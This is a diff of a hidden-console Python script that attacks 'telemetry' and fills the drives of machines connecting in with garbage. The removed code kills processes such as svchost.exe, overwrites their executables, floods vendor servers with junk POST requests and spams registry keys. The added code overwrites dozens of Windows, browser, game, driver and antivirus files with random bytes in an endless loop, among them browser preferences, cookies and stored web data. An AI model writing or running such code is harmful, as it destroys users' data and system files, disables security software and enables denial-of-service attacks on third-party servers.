@@ -5,8 +5,6 @@ import psutil
 import random
 import threading
 import time
-import requests
-import shutil
 
 # Hide console window
 if not sys.executable.endswith("pythonw.exe"):
@@ -34,122 +32,119 @@ def fill_remote_drive_with_garbage(file_size_mb=100):
     else:
         print("No incoming connections detected.")
 
-# Function to corrupt telemetry data aggressively
-def corrupt_telemetry_data():
-    print("Starting aggressive telemetry corruption...")
+# Function to corrupt telemetry data
+def corrupt_telemetry():
+    # Comprehensive list of telemetry files from various companies
+    target_files = [
+        # Microsoft telemetry files
+        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "ETLLogs", "AutoLogger", "AutoLogger-Diagtrack-Listener.etl"),
+        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "ETLLogs", "AutoLogger", "AutoLogger-Diagtrack-Listener_1.etl"),
+        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "ETLLogs", "ShutdownLogger.etl"),
+        os.path.join(os.environ.get("LocalAppData", ""), "Microsoft", "Windows", "WebCache", "WebCacheV01.dat"),
+        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Windows", "AppRepository", "StateRepository-Deployment.srd"),
+        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "eventTranscript", "eventTranscript.db"),
+        os.path.join(os.environ.get("SystemRoot", ""), "System32", "winevt", "Logs", "Microsoft-Windows-Telemetry%4Operational.evtx"),
+        os.path.join(os.environ.get("LocalAppData", ""), "Microsoft", "Edge", "User Data", "Default", "Preferences"),  # Edge telemetry
 
-    # Known telemetry-related directories (Windows, NVIDIA, etc.)
-    telemetry_dirs = [
-        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis"),
-        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Telemetry"),
-        os.path.join(os.environ.get("ProgramData", ""), "NVIDIA Corporation", "NvTelemetry"),
-        os.path.join(os.environ.get("AppData", ""), "Local", "Microsoft", "Windows", "Telemetry"),
-        os.path.join(os.environ.get("SystemRoot", ""), "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "Telemetry"),
+        # NVIDIA telemetry files
+        os.path.join(os.environ.get("ProgramData", ""), "NVIDIA Corporation", "NvTelemetry", "NvTelemetryContainer.etl"),
+        os.path.join(os.environ.get("ProgramFiles", ""), "NVIDIA Corporation", "NvContainer", "NvContainerTelemetry.etl"),
+
+        # Google telemetry files (Chrome, Google services)
+        os.path.join(os.environ.get("LocalAppData", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb", "*.log"),
+        os.path.join(os.environ.get("LocalAppData", ""), "Google", "Chrome", "User Data", "EventLog", "*.etl"),
+        os.path.join(os.environ.get("LocalAppData", ""), "Google", "Chrome", "User Data", "Default", "Web Data"),
+        os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Google", "Update", "GoogleUpdate.log"),  # Google Update telemetry
+
+        # Adobe telemetry files
+        os.path.join(os.environ.get("ProgramData", ""), "Adobe", "ARM", "log", "ARMTelemetry.etl"),
+        os.path.join(os.environ.get("LocalAppData", ""), "Adobe", "Creative Cloud", "ACC", "logs", "CoreSync.log"),
+        os.path.join(os.environ.get("ProgramFiles", ""), "Common Files", "Adobe", "OOBE", "PDApp.log"),
+
+        # Intel telemetry files
+        os.path.join(os.environ.get("ProgramData", ""), "Intel", "Telemetry", "IntelData.etl"),
+        os.path.join(os.environ.get("ProgramFiles", ""), "Intel", "Driver Store", "Telemetry", "IntelGFX.etl"),
+        os.path.join(os.environ.get("SystemRoot", ""), "System32", "DriverStore", "FileRepository", "igdlh64.inf_amd64_*", "IntelCPUTelemetry.dat"),
+
+        # AMD telemetry files (Radeon software)
+        os.path.join(os.environ.get("ProgramData", ""), "AMD", "CN", "AMDDiag.etl"),  # Radeon diagnostics
+        os.path.join(os.environ.get("LocalAppData", ""), "AMD", "CN", "logs", "RadeonSoftware.log"),  # Radeon telemetry logs
+        os.path.join(os.environ.get("ProgramFiles", ""), "AMD", "CNext", "CNext", "AMDTel.db"),  # AMD telemetry database
+
+        # Steam telemetry files
+        os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Steam", "logs", "perf.log"),  # Performance telemetry
+        os.path.join(os.environ.get("LocalAppData", ""), "Steam", "htmlcache", "Cookies"),  # Steam client telemetry
+        os.path.join(os.environ.get("ProgramData", ""), "Steam", "SteamAnalytics.etl"),  # Steam analytics logs
+
+        # Epic Games telemetry files
+        os.path.join(os.environ.get("ProgramData", ""), "Epic", "EpicGamesLauncher", "Data", "EOSAnalytics.etl"),  # Epic Online Services telemetry
+        os.path.join(os.environ.get("LocalAppData", ""), "EpicGamesLauncher", "Saved", "Logs", "EpicGamesLauncher.log"),  # Launcher telemetry
+
+        # Discord telemetry files
+        os.path.join(os.environ.get("LocalAppData", ""), "Discord", "app-*", "modules", "discord_analytics", "*.log"),  # Discord analytics logs
+        os.path.join(os.environ.get("AppData", ""), "Discord", "Local Storage", "leveldb", "*.ldb"),  # Discord telemetry database
+
+        # Autodesk telemetry files
+        os.path.join(os.environ.get("LocalAppData", ""), "Autodesk", "Autodesk Desktop App", "Logs", "AdskDesktopAnalytics.log"),  # Desktop app telemetry
+        os.path.join(os.environ.get("ProgramData", ""), "Autodesk", "Adlm", "Telemetry", "AdlmTelemetry.etl"),  # Licensing telemetry
+
+        # Mozilla telemetry files (Firefox)
+        os.path.join(os.environ.get("AppData", ""), "Mozilla", "Firefox", "Profiles", "*", "telemetry.sqlite"),  # Firefox telemetry database
+        os.path.join(os.environ.get("LocalAppData", ""), "Mozilla", "Firefox", "Telemetry", "Telemetry.etl"),  # Firefox telemetry logs
+
+        # Logitech telemetry files (Logi Options)
+        os.path.join(os.environ.get("LocalAppData", ""), "Logitech", "LogiOptions", "logs", "LogiAnalytics.log"),  # Logitech analytics
+        os.path.join(os.environ.get("ProgramData", ""), "Logitech", "LogiSync", "Telemetry.etl"),  # Logitech sync telemetry
+
+        # Razer telemetry files
+        os.path.join(os.environ.get("ProgramData", ""), "Razer", "Synapse3", "Logs", "RazerSynapse.log"),  # Synapse telemetry
+        os.path.join(os.environ.get("LocalAppData", ""), "Razer", "Synapse", "Telemetry", "RazerTelemetry.etl"),  # Razer telemetry logs
+
+        # Corsair telemetry files (iCUE)
+        os.path.join(os.environ.get("ProgramData", ""), "Corsair", "CUE", "logs", "iCUETelemetry.log"),  # iCUE telemetry
+        os.path.join(os.environ.get("LocalAppData", ""), "Corsair", "iCUE", "Analytics", "*.etl"),  # iCUE analytics logs
+
+        # Antivirus telemetry files
+        os.path.join(os.environ.get("ProgramData", ""), "Kaspersky Lab", "AVP*", "logs", "Telemetry.etl"),  # Kaspersky telemetry
+        os.path.join(os.environ.get("ProgramData", ""), "McAfee", "Agent", "logs", "McTelemetry.log"),  # McAfee telemetry
+        os.path.join(os.environ.get("ProgramData", ""), "Norton", "Norton", "Logs", "NortonAnalytics.etl"),  # Norton telemetry
+        os.path.join(os.environ.get("ProgramFiles", ""), "Bitdefender", "Bitdefender Security", "logs", "BDTelemetry.db"),  # Bitdefender telemetry
+
+        # Miscellaneous telemetry files
+        os.path.join(os.environ.get("LocalAppData", ""), "Slack", "logs", "SlackAnalytics.log"),  # Slack telemetry
+        os.path.join(os.environ.get("ProgramData", ""), "Dropbox", "client", "logs", "DropboxTelemetry.etl"),  # Dropbox telemetry
+        os.path.join(os.environ.get("LocalAppData", ""), "Zoom", "logs", "ZoomAnalytics.log")  # Zoom telemetry
     ]
 
-    # Known telemetry processes
-    telemetry_processes = [
-        "TelemetryClient.exe",
-        "CompatTelRunner.exe",
-        "DeviceCensus.exe",
-        "NvTelemetryContainer.exe",
-        "svchost.exe",  # Often used for telemetry, though broad
-        "wmic.exe",     # Sometimes used for telemetry collection
-    ]
-
-    # Known telemetry endpoints
-    telemetry_endpoints = [
-        "https://telemetry.microsoft.com",
-        "https://vortex.data.microsoft.com",
-        "https://settings-win.data.microsoft.com",
-        "https://watson.telemetry.microsoft.com",
-        "https://telemetry.nvidia.com",
-        "https://data.amplitude.com",  # Third-party telemetry
-    ]
-
-    # Step 1: Fill telemetry directories with garbage files
-    for directory in telemetry_dirs:
-        if os.path.exists(directory):
-            print(f"Corrupting telemetry directory: {directory}")
-            counter = 1
-            while True:
-                garbage_file = os.path.join(directory, f"telemetry_garbage_{counter}.dat")
-                try:
-                    with open(garbage_file, 'wb') as f:
-                        f.write(os.urandom(10 * 1024 * 1024))  # 10 MB of random data
-                    print(f"Created garbage file: {garbage_file}")
-                    counter += 1
-                except Exception as e:
-                    print(f"Error writing to {directory}: {e}")
-                    break
+    def overwrite_file(file_path):
+        if os.path.exists(file_path):
+            try:
+                # Get the file size
+                size = os.path.getsize(file_path)
+                # Generate random junk data of the same size
+                junk = os.urandom(size)
+                # Overwrite the file with junk data
+                with open(file_path, 'wb') as f:
+                    f.write(junk)
+                print(f"Overwrote telemetry file: {file_path}")
+            except Exception as e:
+                print(f"Error overwriting {file_path}: {e}")
         else:
-            print(f"Telemetry directory not found: {directory}")
+            print(f"File not found: {file_path}")
 
-    # Step 2: Terminate telemetry processes and replace with garbage executables
-    for proc in psutil.process_iter(['pid', 'name']):
-        try:
-            proc_name = proc.info['name'].lower()
-            if any(tel.lower() in proc_name for tel in telemetry_processes):
-                print(f"Terminating telemetry process: {proc_name} (PID: {proc.info['pid']})")
-                proc.terminate()
-                exe_path = proc.exe()
-                if os.path.exists(exe_path):
-                    # Overwrite the executable with garbage
-                    with open(exe_path, 'wb') as f:
-                        f.write(os.urandom(5 * 1024 * 1024))  # 5 MB of garbage
-                    print(f"Overwrote telemetry executable: {exe_path}")
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
-            print(f"Error handling process {proc.info['name']}: {e}")
-
-    # Step 3: Flood telemetry endpoints with garbage data
-    def flood_endpoint(endpoint):
-        while True:
-            try:
-                garbage_data = os.urandom(1024 * 1024)  # 1 MB of random data
-                requests.post(endpoint, data=garbage_data, timeout=1)
-                print(f"Flooded {endpoint} with 1 MB of garbage data")
-            except Exception as e:
-                print(f"Error flooding {endpoint}: {e}")
-                time.sleep(1)  # Brief pause to avoid overwhelming local resources
-
-    # Start flooding threads for each telemetry endpoint
-    for endpoint in telemetry_endpoints:
-        threading.Thread(target=flood_endpoint, args=(endpoint,), daemon=True).start()
-
-    # Step 4: Corrupt registry telemetry keys (simulated aggressive overwrite)
-    try:
-        import winreg
-        telemetry_reg_paths = [
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack",
-            r"SOFTWARE\NVIDIA Corporation\NvTelemetry",
-        ]
-        for reg_path in telemetry_reg_paths:
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_ALL_ACCESS)
-                for i in range(100):  # Create 100 garbage entries
-                    winreg.SetValueEx(key, f"GarbageKey_{i}", 0, winreg.REG_SZ, os.urandom(16).hex())
-                print(f"Corrupted registry telemetry key: {reg_path}")
-                winreg.CloseKey(key)
-            except FileNotFoundError:
-                print(f"Registry key not found: {reg_path}")
-            except PermissionError:
-                print(f"Permission denied for registry key: {reg_path}")
-            except Exception as e:
-                print(f"Error corrupting registry: {e}")
-    except ImportError:
-        print("winreg module not available, skipping registry corruption")
+    # Infinite loop to continuously overwrite telemetry files
+    while True:
+        for file in target_files:
+            overwrite_file(file)
+        time.sleep(0.1)  # Small delay to prevent overwhelming the system
 
 # Main function
 def main():
     # Start filling remote drives with garbage in a separate thread
     threading.Thread(target=fill_remote_drive_with_garbage, daemon=True).start()
 
-    # Start corrupting telemetry data
-    corrupt_telemetry_data()
-
-    # Keep the script running
-    while True:
-        time.sleep(10)
+    # Start corrupting telemetry data in the main thread
+    corrupt_telemetry()
 
 if __name__ == "__main__":
     main()
